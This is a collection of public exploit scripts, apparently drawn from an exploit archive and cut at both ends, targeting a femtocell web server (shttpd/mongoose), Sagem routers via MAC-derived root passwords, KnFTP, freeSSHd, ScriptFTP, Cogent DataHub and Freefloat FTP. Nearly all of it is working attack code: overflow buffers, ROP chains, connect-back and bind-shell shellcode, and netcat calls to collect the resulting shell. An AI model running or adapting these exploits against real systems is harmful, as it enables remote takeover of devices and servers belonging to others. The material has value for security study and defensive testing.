"\x0e\x5a\x3e\x49\x62\x32\x06\xf4\x40\xd5\x8c\xfd\xca\x6e\xa9"+
"\xff\x58\xdf\xc1\x15\xd6\xec\x96\xcb\x04\x4d\xab\x8e\x6c\xed"+
"\x23\x61\x53\x7c\x85\xb8\x09\xba\xc0\x11\x71\x9f\xd1\x5a\x35"+
"\xff\x95\xcc\x63\xed\x97\xda\x63\xf5\x97\xca\x66\xed\xa9\xe5"+
"\xf9\x84\x47\x63\xe0\x32\x21\xd2\x63\xfd\x3e\xac\x5d\xb3\x46"+
"\x81\x55\x44\x14\x27\xc5\x0e\x63\xca\x5d\x1d\x54\x21\xa8\x44"+
"\x14\xa0\x33\xc7\xcb\x1c\xce\x5b\xb4\x99\x8e\xfc\xd2\xee\x5a"+
"\xd1\xc1\xcf\xca\x6e\xc1\x9c\x35")

# more padding
buffer += "\x90" * 8

# jmp edx (shell32.dll Windows XP SP3 Spanish) (edx points to the 1st nopsled)
buffer += "\x9a\x5c\x3c\x7e"

# end connection
buffer += "\x0a"

# send buffer
print "[!] Sending exploit..."
sock.send(buffer)
sock.recv(1024)
sock.close()
print "[!] Exploit succeed. Now netcat %s on port 4444\n" %(sys.argv[1])
sys.exit()#!/usr/bin/env python
# part of femtocell research by TU-Berlin
# only for educational purposes
# Exploit Title: remote root on sfr/ubiquisys femtocell webserver (wsal/shttpd/mongoose)
# Date: 2011-08-02
# Author: nion
# Software: http://code.google.com/p/mongoose/ http://sourceforge.net/projects/shttpd/
# Version: shttpd <= 1.42, mongoose <= 3.0
# CVE: CVE-2011-2900
# Tested on: Linux (proprietary embedded distro) Linux 2.6.18-ubi-sys-V2.0.17

import socket, sys, time
import urllib, struct

if(len(sys.argv) < 3):
	print sys.argv[0] + " <target ip> <listening ip>"
	sys.exit(-1)

target   = sys.argv[1]
listener = sys.argv[2]

SHELLCODE  = 0xbc568        # shellcode backup in connect struct, heap is not randomized
STACK_LIFT = "%a0%ce%31%40" # didnt want to use urllib to encode at this point
                            # because it moves the heap address depending on if character is printable or not
							# and i was too lazy to adjust the payload when cleaning up the exploit :)

buf = "PUT /"
buf += "A" * 107 # first fill bytes will not be 148 because stack layout looks different when leaving put_dir()
buf += STACK_LIFT

# repeated stack lifting
for i in xrange(0, 26):
	buf += "A" * 148
	buf += STACK_LIFT

buf += "B"*132    # padding to overwrite pc, last jump will go over this one
buf += STACK_LIFT # this will hit pc and produce our first jump
                  # add sp, sp, #132; pop {r4, r5, r6, r7, pc}

buf += "A"*12     # this will be our last stack lifting after
buf += STACK_LIFT # jumping through our buffer back up

# lets finish the path chunk and make some padding for the
# last stack lift before pc gets popped to a different place
buf+="AAAAAAAAA/"+"A"*138


# first jump
buf += urllib.quote(struct.pack("<L", 0x4032a410))
# --,
#   v
# prepare lr so we can properly return from __clear_cache
# 0x4032a410 <makecontext+28>:  pop {lr}        ; (ldr lr, [sp], #4)
# 0x4032a414 <makecontext+32>:  add sp, sp, #8  ; 0x8
# 0x4032a418 <makecontext+36>:  bx  lr
buf+=urllib.quote(struct.pack("<L", 0x403e937c)) # free_slotinfo+128, return from __clear_cache
buf+="DDDDDDDD" # skip sp lifting, 8 dummy bytes because sp is lifted before branching

# --, bx lr
#   v
# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
buf+="CCCC" # dummy r4
buf+=urllib.quote(struct.pack("<L", 0x402e5064)) # __aeabi_cfcmple+16
# --,
#   v
# 0x402e5064 <__aeabi_cfcmple+16>:   pop {r0, r1, r2, r3, pc}
buf+="AAAA" # dummy r0
buf+="CCCC" # dummy r1 (needed for __clear_cache)
buf+="DDDD"*2 # dummy r2, r3
buf+=urllib.quote(struct.pack("<L", 0x40364bbc)) # envz_merge+184
# --,
#   v
# 0x40364bbc <envz_merge+184>:  mov r0, r11
# 0x40364bc0 <envz_merge+188>:  pop {r4, r5, r6, r7, r8, r9, r11, pc}
# at this point r11 points to an address on the heap in front of
# our shellcode, e.g. 0xad220
buf+="FFFF"*7 # dummy r4-r9+r11
buf+=urllib.quote(struct.pack("<L", 0x402e5484)) # __clear_cache
# --,
#   v
# __clear_cache will return to our prepare lr (free_slotinfo+128)
# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
buf+="AAAA" # dummy r4
buf +=urllib.quote(struct.pack("<L", SHELLCODE)) # jump to shellcode

# shellcode + some testing garbage in front of it
buf += "A"*16 # some garbage padding in front of our payload, could be nops or whatever

# make listener shellcode friendly
evil_haxxor = urllib.quote("".join([struct.pack("B", int(x)) for x in listener.split('.')]))

# connect back shellcode
buf += "%01%10%8F%E2%11%FF%2F%E1%02%20%01%21%92%1A%0F%02%19%37%01%DF%06%1C%08%A1%10%22%02%37%01%DF%3F%27%02%21%30%1c%01%df%01%39%FB%D5%05%A0%92%1A%05%b4%69%46%0b%27%01%DF%C0%46%02%00%11%5c" + evil_haxxor + "%2f%62%69%6e%2f%73%68%00/ HTTP/1.0\r\n"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target, 80))
s.send(buf)
s.send("\r\n")
print s.recv(1024)
#!/home/bin/python

# Remote Exploit: SAGEM ROUTER FAST 3304/3464/3504 - Telnet Authentication bypass
# Date: 15-August-2011
# Author: Elouafiq Ali
# Version: 3304-V1 / 3304-V2 / 3464 / 3504
# Tested on: Linux Ubuntu 11.04, Linux Backtrack 5
# Tested Router: SAGEM FAST 3304-V2
# Tested on Resellers/ISPs: Wanadoo (France), Maroc Telecom (Morocco)
# Products affected: Sagem Fast 3304-V1 / 3304-V2 / 3464 / 3504
# Blog: http://keelhaule.tumblr.com

"""
	Sagem Fast Routers (3304-V1 / 3304-V2 / 3464 / 3504) Come with a default Preconfigured Root Password
	That the ISPs don't change it, but instead they create another admin account above it,
	the root password differs from a router to another, since it is computed from its MAC address.
	Thus, each unique router has its own password what makes bruteforce or dictionary attacks inefficient or impossible
	After reverse engineering the Algorithm that computes the default password based on the MAC address
	This exploit opens a remote shell in the remote host.
	(Generally its an Almquist Shell 'ash', which commands are compatible to the Bourne Shell 'bsh')

	Usage: ./{file_name} ip_adress mac_address
"""


from telnetlib import Telnet
import time, sys, tty, termios
from threading import *

host = ''
port = 23
user = "root" 
password=""
class ReaderThread(Thread):
        def __init__(self, telnet):
                self.telnet = telnet
                Thread.__init__(self)
        
        def run(self):
                while 1:
                        str = self.telnet.read_some()
                        if str == '': break
                        sys.stdout.write(str)
                        sys.stdout.flush()
def mash(a,b):
  first=min(a,b)
  second=max(a,b)
  if( int(second ,16 ) < 10) :
    if(int(first,16)+int(second,16)<=9):
      return chr(ord(first)+int(second,16))
    else:
      return hex(ord(first)+int(second,16))
  else: 
      return chr(ord(second)+int(first,16))

def main(host, port):
        telnet = Telnet()
        telnet.open(host, port)
	#Usually Telnet prompt starts with this, if the telnet service provide another
	#prompt, change it to that prompt
	telnet.read_until("login: ") 
	telnet.write(user + "\n")
	#the note above also applies for this
	telnet.read_until("Password: ")
	telnet.write(password + "\n")
	#just omit this line if you want to just have the telnet command prompt,
	#or change it to what feel confortable with
	telnet.write("shell\n")
        reader = ReaderThread(telnet)
        reader.start()

	fd = sys.stdin.fileno()
	old_settings = termios.tcgetattr(fd)
	tty.setraw(fd)
        while 1:
                if not reader.isAlive(): break
		ch = sys.stdin.read(1)
                telnet.write(ch)
        telnet.close()
	termios.tcsetattr(fd, 1, old_settings)

if __name__ == '__main__':
        try:
                host = sys.argv[1]
        except: pass
	mac_address=sys.argv[2]
	lenght=len(mac_address)
	#some arbitrary value
	password=[ c for c in "00000000" ] 
	if lenght!=12 :
		# Input Sanitization and Normalization
		if lenght==17:
			if mac_address[2]==':' :
				mac_address = "".join([i.zfill(2) for i in mac_address.split(":")]).lower()
			elif mac_address[2]=='-' :
				mac_address = "".join([i.zfill(2) for i in mac_address.split(":")]).lower()
			else:	
				print  '[!] Please enter a valid MAC address!'	
				exit()
		else:
			print  "[!] Please enter a valid MAC address!"
			exit()
	
	mac=[ c.lower() for c in mac_address]

	password[0]= mash(mac[5],mac[11])
	password[1]= mash(mac[0],mac[2])
	password[2]= mash(mac[10],mac[11])
	password[3]= mash(mac[0],mac[9])
	password[4]= mash(mac[10],mac[6])
	password[5]= mash(mac[3],mac[9])
	password[6]= mash(mac[1],mac[6])
	password[7]= mash(mac[3],mac[4])
	password="".join(p for p in password)
	print "[+] W00t The Passwd is ", password
        main(host, port)

# Exploit written by Ali Elouafiq , Exploit-DB , 2011
#!/usr/bin/python
# tested on windows xp sp3
# overwrites EIP
# seh is overwritten with larger payloads
# knftpd.exe is the only non safeseh module
import sys,socket

print "\n====================="
print "KnFTP Buffer Overflow"
print "   Written by Blake  "
print "=====================\n"

if len(sys.argv) !=3:
	print "[*] Usage: %s <ip> <port>" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
port = int(sys.argv[2])

# 271 bytes of space for shellcode
# 227 bytes windows/exec CMD => calc.exe
shellcode =(
"\xb8\xe8\xaa\x5e\xc0\xdb\xd6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x33\x31\x43\x12\x03\x43\x12\x83\x03\x56\xbc\x35\x2f\x4f\xc8"
"\xb6\xcf\x90\xab\x3f\x2a\xa1\xf9\x24\x3f\x90\xcd\x2f\x6d\x19"
"\xa5\x62\x85\xaa\xcb\xaa\xaa\x1b\x61\x8d\x85\x9c\x47\x11\x49"
"\x5e\xc9\xed\x93\xb3\x29\xcf\x5c\xc6\x28\x08\x80\x29\x78\xc1"
"\xcf\x98\x6d\x66\x8d\x20\x8f\xa8\x9a\x19\xf7\xcd\x5c\xed\x4d"
"\xcf\x8c\x5e\xd9\x87\x34\xd4\x85\x37\x45\x39\xd6\x04\x0c\x36"
"\x2d\xfe\x8f\x9e\x7f\xff\xbe\xde\x2c\x3e\x0f\xd3\x2d\x06\xb7"
"\x0c\x58\x7c\xc4\xb1\x5b\x47\xb7\x6d\xe9\x5a\x1f\xe5\x49\xbf"
"\x9e\x2a\x0f\x34\xac\x87\x5b\x12\xb0\x16\x8f\x28\xcc\x93\x2e"
"\xff\x45\xe7\x14\xdb\x0e\xb3\x35\x7a\xea\x12\x49\x9c\x52\xca"
"\xef\xd6\x70\x1f\x89\xb4\x1e\xde\x1b\xc3\x67\xe0\x23\xcc\xc7"
"\x89\x12\x47\x88\xce\xaa\x82\xed\x21\xe1\x8f\x47\xaa\xac\x45"
"\xda\xb7\x4e\xb0\x18\xce\xcc\x31\xe0\x35\xcc\x33\xe5\x72\x4a"
"\xaf\x97\xeb\x3f\xcf\x04\x0b\x6a\xac\xcb\x9f\xf6\x1d\x6e\x18"
"\x9c\x61")

# 32 byte egghunter
egghunter =(
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
"\x54\x30\x30\x57" # egg - W00T
"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

egg = "\x54\x30\x30\x57\x54\x30\x30\x57"
buffer = "\x90" * (271 - len(egg + shellcode))
eip = "\x13\x44\x87\x7c" 	# 7C874413 JMP ESP - kernel32.dll
nops = "\x90" * 8

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d" % (target,port) 
try:
	s.connect((target,port))
	print "[+] Sending payload"
	s.send("USER blake \r\n")
	s.recv(1024)
	s.send("PASS " + buffer + egg + shellcode + eip + nops + egghunter + "\r\n")
	s.recv(1024)
	s.close()
	print "[+] Payload sent successfully"
	raw_input("[+] Press any key to exit\n")
except:
	print "[+] Could not connect to %s!" % target
	sys.exit(0)


#!/usr/bin/env python

"""
Coded by Tauqeer Ahmad a.k.a 0x-Scientist-x0
ahmadtauqeer[at]yahoo.com
Disclaimer: This Proof of concept exploit is for educational purpose only.
           Please do not use it against any system without prior permission.
           You are responsible for yourself for what you do with this code.

Greetings: All the Pakistani White Hats including me ;)
Flames:    To all the skript kiddies out there. Man grow up!.
Code tasted against freeSSHd version 1.0.9
If you didn't get shell at first try, try few times and you will get lucky

Advisories:
http://www.securityfocus.com/bid/17958
http://www.frsirt.com/english/advisories/2006/1786

"""
import socket
import getopt
import sys

host = "192.168.0.2"
port = 0
eip =""

#/* win32_bind -  EXITFUNC=thread LPORT=1977 Size=317 Encoder=None http://metasploit.com */
shellcode =    "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
               "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
               "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
               "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
               "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
               "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
               "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
               "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
               "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
               "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0" \
               "\x66\x68\x07\xb9\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff" \
               "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53" \
               "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff" \
               "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64" \
               "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89" \
               "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab" \
               "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51" \
               "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53" \
               "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6" \
               "\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"


def exploit():

   buff = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48" \
          "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"

   buff = buff + "A" * 1055
   buff = buff + eip
   buff = buff + "yyyy"
   buff = buff + "\x90" * 4
   buff = buff + shellcode
   buff = buff + "B" * 19021 + "\r\n"

   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   sock.connect((host, port))
   print "+ Recive reply from server: " + sock.recv(1000)

   sock.send(buff)
   print "+ SSHD exploited. Now telnet to port 1977 to get shell "
   print "+ if you didnt get shell in first try.Try again until you success"

   sock.close()
   sock = None


def usage():
   print "#############################################"
   print "#           CODED BY TAUQEER AHMAD          #"
   print "#                 Scientist                 #"
   print "#############################################"
   print "\n"
   print "Usage: %s -h <hostip> -p <port> -o <OS>" % sys.argv[0]
   print "Following OS supported\n"
   print "1 Window XP SP1"
   print "2 Window XP SP2"
   print "3 Windows 2000 Advanced Server"


if __name__ == '__main__':

   if len(sys.argv) < 7:
       usage()
       sys.exit()

   try:
       options = getopt.getopt(sys.argv[1:], 'h:p:o:')[0]
   except getopt.GetoptError, err:
       print err
       usage()
       sys.exit()


   for option, value in options:
       if option == '-h':
           host = value
       if option == '-p':
           port = int(value)
       if option == '-o':
           if value == '1':
               eip = "\xFC\x18\xD7\x77"  # 77D718FC JMP ESP IN USER32.dll (Windows Xp professional SP1)
           elif value == '2':
               eip = "\x0A\xAF\xD8\x77"  # 77D8AF0A JMP ESP IN USER32.DLL (Windows Xp professional SP2)
           elif value == '3':
               eip = "\x4D\x3F\xE3\x77"  # 77E33F4D JMP ESP IN USER32.DLL (windows 2000 advanced server)
           elif value == '4:
	       eip = "\x29\x4c\xE1\x77"  # 77E14c29 JMP ESP IN USER32.DLL (windows 2000 Prof. SP4)
           else:
               usage()
               sys.exit()

   exploit()

# milw0rm.com [2006-05-15]
# Exploit Title: ScriptFTP <=3.3 Remote Buffer Overflow (LIST)
# Date: September 20, 2011
# Author: modpr0be
# Software Link: http://www.scriptftp.com/ScriptFTP_3_3_setup.exe
# Version: 3.3
# Tested on: Windows XP SP3, Windows Server 2003 SP1 (SE) (VMware 3.1.4 build-385536)
# CVE : -
#
# Thanks: offsec, exploit-db, corelanc0d3r, 5M7X, loneferret, mr_me, _sinner
# 
# You should create your own script to work with ScriptFTP
# for example; enable passive and get the remote directory 
# on your evil ftp server.
#
# my example script:
# OPENHOST("8.8.8.8","ftp","ftp")
# SETPASSIVE(ENABLED)
# GETLIST($list,REMOTE_FILES)
# CLOSEHOST
# save it to a file with .ftp extension (eg: exploit.ftp)

# root@bt :/# python scriptftp-bof-poc.py
# [*] ScriptFTP 3.3 Remote Buffer Overflow POC
# [*] by modpr0be[at]digital-echidna[dot]org.
# [*] thanks a lot to cyb3r.anbu | otoy :)
# =============================================
# [*] Evil FTP Server Ready
# [*] Server initiated.
# [*] Awaiting connection...
# [*] Connection created by 172.16.87.129.
# [*] Establishing session.
# [*] Pwning in progress..
# [*] This may take up 50 seconds or less.
# [!] Hunter is hunting the Egg ;)
# [!] Waiting for a shell..
# [!] 0wn3d..!
#
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\ScriptFTP>
#
# Yes, this poc is using PASSIVE connection and it will
# take some time to establish. I love the way we wait for a shell ;)

#!/usr/bin/python

import socket
import os
import sys
import time

class ftp_server:
    def __init__(self):
        self.host = '0.0.0.0'
        self.passive_port = 7214
        self.log("""
[*] ScriptFTP <=3.3 Remote Buffer Overflow POC
[*] by modpr0be[at]digital-echidna[dot]org
[*] thanks a lot to cyb3r.anbu | otoy :)
=============================================
[*] Evil FTP Server Ready""")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('', 21))
        self.sock.listen(1)

        a = self.passive_port/256
        b = self.passive_port%256
        self.tuple_port = (a, b)
        self.host_join = ','.join(self.host.split('.'))
        self.passive = False

        self.log("[*] Server initiated.")

    def log(self, msg):
        print msg

    def get(self):
        return self.conn.recv(1024).replace('\r', '').replace('\n', '')

    def getcwd(self):
        return os.getcwd().split(chr(92))[-1]
    
    def put(self, ftr):
        x = {

            150:" Data connection accepted from %s:%s; transfer starting.\r\n226 Listing completed."%(self.host, self.passive_port),
            200:" Type okay.",
            220:" %s Server is ready."%self.host,
            226:" Listing completed.",
            227:" Entering Passive Mode (%s,%s,%s)"%(self.host_join, self.tuple_port[0], self.tuple_port[1]),
            230:" User logged in, proceed.",
            250:' "/%s" is new cwd.'%self.getcwd(), 
            257:' "/%s" is cwd.'%self.getcwd(),
            331:" User name okay, need password.",
            502:" Command not implemented.",
            551:" Requested action aborted. Page type unknown."      

                   }[ftr]

        s = '%s%s\r\n'%(ftr, x)
        self.conn.send(s)
        return s

    def main(self):
        self.log("[*] Awaiting connection...")
        self.conn, addr = self.sock.accept ()
        self.log("[*] Connection created by %s.\n[*] Establishing session."%addr[0])
	self.put(220)
        self.log("[*] Pwning in progress..")
	self.log("[*] This may take up 50 seconds or less.")

        while 1:
            try: 
                data = self.get().upper()
            except socket.error:
                self.conn.close()
                self.sock.shutdown(socket.SHUT_RDWR)
                raise socket.error
	    
            if data[:4] == 'USER':   s = 331
            elif data[:4] == 'PASS': s = 230
            elif data[:3] == 'PWD':  s = 257
            elif data[:4] == 'TYPE': s = 200
            elif data[:4] == 'PASV':
                # create passive port
                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.bind(('', self.passive_port ))
                self.sock2.listen(1)
                s = self.put(227)
                self.conn2, addr = self.sock2.accept()
                self.passive = True
                s = 0 # don't routine
      
            elif data[:3] == 'CWD':
                try:
                    os.chdir('..%s'%data.split(' ')[-1])
                    s = 250
                except OSError:
                    s = 551
		    
            elif data[:4] == 'LIST':
                s = self.put(150)
                s = self.passive_do(1)
                s = 0 # don't routine
		print "[!] Hunter is hunting the Egg ;)"
		time.sleep(50)
		print "[!] Waiting for a shell.."
		time.sleep(2)
		print "[!] 0wn3d..!\n"
		os.system("nc %s 4444"%addr[0])
		sys.exit()
            else:
		s = 502

            if s:
                s = self.put(s)

    def passive_do(self, id):
        if id == 1:
	    #bind to port 4444
	    bind = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQ"
                    "APA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1A"
                    "IQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLI"
                    "XTIKPKPKPC0DIZENQXRS4DK0RNPTKPRLLTKR2LTTKBRO"
                    "8LOVWPJMVNQKONQGPFLOL1Q3LLBNLMPY18OLMM1I7K2J"
                    "P0RR74KPRN0DKOROLKQZ0DKOPRX4EY0RTPJKQXP0PTK1"
                    "8N8DKQHMPKQHSJCOLOYTKODDKM1HVNQKONQY0VLWQHOL"
                    "MKQWWP8IPCEL4LCSML8OK3MMTRUK2R84KQHMTM1YCQV4"
                    "KLLPKTKPXMLKQZ3TKM4TKKQ8P4IQ4O4MTQKQK1QPYPZ2"
                    "1KOK0PXQO1J4KN2ZKU61MQXNSP2KPKPS82W2SP21OQD3"
                    "80LSGNFLGKOZ56X4PM1KPKPO9XDPTPPQXNI3P2KM0KOX"
                    "U0PPPPP0POP0POPPPQXJJLOIOYPKOJ5SYGWNQIKPSBHM"
                    "2KPN1QLU9YVRJLPQFQGC8GRIK07QWKO8U0SR7C87GZIP"
                    "8KOKOJ50SR3PWRHCDZLOKYQKO8UPW5997QX2URN0MQQK"
                    "OYEQX33BMQTKPSYJCPWPWR701JV2JMBR926IRKMQVGWO"
                    "TMTOLKQKQTMPDNDLP7VKPQ40TB0PVPVPVOV26PNQFR6P"
                    "SR6C8SIXLOOTFKOXUCY9P0N0VPFKONPS8KXSWMMQPKO9"
                    "E7KL0X5W2QFQXVFTUWMEMKOHUOLKV3LKZU0KKYP2ULEW"
                    "KQ7MCT2BO2JKPQCKOZ5A")
	    
	    # 32bit egghunter from corelanc0d3r, thx ;)
	    egghunter = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYA"
			 "IAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA5"
			 "8AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZB"
			 "ABABABAB30APB944JBQVCQGZKOLO12PRQZKR1"
			 "HXMNNOLKUQJRTJO6XKPNPKP44TKJZ6O3EJJ6O"
			 "SEYWKOYWA")
				   
	    junk = "A" * 1746		#junk
	    nseh = "\x61\x62"		#nseh
            seh = "\x45\x5B" 		#seh ppr somewhere on scriptftp dir 
            
	    #prepare for align
            align = "\x60"			#pushad
	    align += "\x73"			#nop/align
	    align += "\x53"			#push ebx
	    align += "\x73"			#nop/align
            align += "\x58"			#pop eax
	    align += "\x73"			#nop/align
	    align += "\x05\x02\x11"     	#add eax,0x11000200
	    align += "\x73"             	#nop/align
            align += "\x2d\x01\x11"     	#sub eax,0x11000120
	    align += "\x73"             	#nop/align
	    
	    #walking
   	    walk = "\x50"			#push eax
	    walk += "\x73"			#nop/align
	    walk += "\xc3"			#ret
    
	    #align again
	    align2 = "0t0t" + "\x73\x57\x73\x58\x73"		#nop/push edi/nop/pop eax/nop
	    align2 += "\xb9\x1b\xaa"			#mov ecx,0xaa001b00
	    align2 += "\xe8\x73"			#add al,ch + nop
	    align2 += "\x50\x73\xc3"			#push eax,nop,ret

	    sampah1 = "\x44" * 106 + "\x73"		#eax+106/align nop
	    sampah2 = "\x42" * 544			#right after shellcode
	    
	    crash = junk+nseh+seh+align+walk+sampah1+egghunter+sampah2+align2+bind+sampah1

            res = """-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+crash+""".txt\r\ndrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\nrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+ crash +".txt\r\n"

        self.conn2.send(res)
        # self.conn2.send('\r\n') # send blank
	return res

try:
	ftp_server().main()
except socket.error:
        print "[!] Socket is not ready, shutting down...\n"

#!/usr/bin/python
#
# Cogent Datahub <= v7.1.1.63 Remote Unicode Buffer Overflow Exploit
# tested on:
# - windows server 2003
# - windows XP sp3
# questions >> @net__ninja || @luigi_auriemma
# example usage:
# [mr_me@neptune cognet]$ ./cognet_overflow.py 192.168.114.130
#
# -----------------------------------------------------
# ------ Cogent Datahub Unicode Overflow Exploit ------
# ------------- Found by Luigi Auriemma ---------------
# --------- SYSTEM exploit by Steven Seeley -----------
#
# (+) Sending overflow...
# (+) Getting shell..
# Connection to 192.168.114.130 1337 port [tcp/menandmice-dns] succeeded!
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>whoami
# whoami
# nt authority\system
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>

import socket,time,sys,os

# bindshell on port 1337
shellcodez = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQA"
"IAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1"
"111AIAJQI1AYAZBABABABAB30APB944JBKLQZJKPMK8JYKOKOKOQPTK"
"2LMTMTDKOUOLTKCLKUT8M1JOTKPOLXTKQOMPM1JKOY4KNTTKM1JNNQ9"
"04Y6LU4I0D4M77QHJLMKQ92ZKL4OK0TMTO8BUIUTK1OO4KQZK1VDKLL"
"PKTKQOMLM1ZKM3NLTKU9RLMTMLQQ7SNQ9KQTTK0CNP4KOPLL4KRPMLV"
"M4KOPLHQN384NPNLNJLPPKOJ6QVPSQVQX03OBRHT7RSNR1OB4KO8PBH"
"XKZMKLOKR0KOHVQOU9YU1VE1JMM8KRB5QZLBKOXPBH8YM9JUFMQGKOZ"
"6PSPSR30SQCPC23PCPSKOXPC6RHKUP936PSSYYQV5QX5TMJ40GWPWKO"
"8VRJLPR1R5KOHPQXG4VMNNIY0WKOZ6QC25KOXPBH9U19U6OY27KO9FP"
"PR4R41EKOXPUC1X9W49GVRYPWKO8V0UKOXP1VQZRD2FQXQSBMU9YUQZ"
"0PPYNI8LTI9W2J14U9K201GPKCUZKNORNMKNPBNL63TM2ZNXVKFK6KQ"
"XBRKNVSN6KOT5Q4KOIFQK0WB2PQ0Q0Q1ZM1PQR1PUR1KOXPRHVMJ9KU"
"8NQCKOHVQZKOKO07KOZ0DK0WKLTCWTRDKOHV0RKO8P38JPTJKTQOR3K"
"O8VKO8PKZA")

align= ""
align += "\x54"			# push esp
align += "\x6f"
align += "\x58"			# pop eax
align += "\x6f"
align += "\x05\x6f\x11"	# add eax,11006f00   
align += "\x6f" 
align += "\x2d\x37\x01"	# sub eax,01003700
align += "\x6f"
align += "\x2d\x37\x10"	# sub eax,11003700
align += "\x6f"
align += "\x50"			# push eax
align += "\x6f"
align += "\x48"			# dec eax
align += "\x6f"
align += "\x48"			# dec eax
align += "\x6f"
align += "\x55"			# push ebp
align += "\x6f"
align += "\x59"			# pop ecx
align += "\x08"			# add [eax],cl (carve a 'RETN' onto the stack)
align += "\x6f"
align += "\x40"			# inc eax
align += "\x6f"
align += "\x40"			# inc eax
align += "\x6f\x41" * (48)	# inc ecx (will not effect to our payload)
align += "\x6f"
align += "\x62"			# becomes our carved RETN on the stack (0x61+0x62=0xc3)

request = "(domain \""
request += "\x61" * 1019
request += "\x7f\x55" 	# jmp esp 0x0055007f
request += align
request += shellcodez
request += "\")\r\n"

def banner():
	banner = "\n-----------------------------------------------------\n"
	banner += "------ Cogent Datahub Unicode Overflow Exploit ------\n"
	banner += "------------- Found by Luigi Auriemma ---------------\n"
	banner += "--------- SYSTEM exploit by Steven Seeley -----------\n"
	return banner

if len(sys.argv) < 2:
	print banner()
	print "(-) Usage: %s <target addr> " % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
print banner()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,4502))
except:
    print "[-] Connection to %s failed! % (target)"
    sys.exit(0)

print "(+) Sending overflow..."
s.send(request)
s.recv(1024)
# wait for the target, sheesh.
time.sleep(2)
print "(+) Getting shell.."
os.system("nc -vv %s 1337" % target)
s.close()
#!/usr/bin/python
import socket, sys
from struct import pack

print "\n==============================="
print "Freefloat FTP Server DEP Bypass"
print "       Written by Blake        "
print "===============================\n"

if len(sys.argv) != 3:
	print "[*] Usage: %s <target> <port>\n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
port = int(sys.argv[2])

# 728 bytes for shellcode
#Bind Shell shellcode port 4444
shellcode = ("\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
"\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
"\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
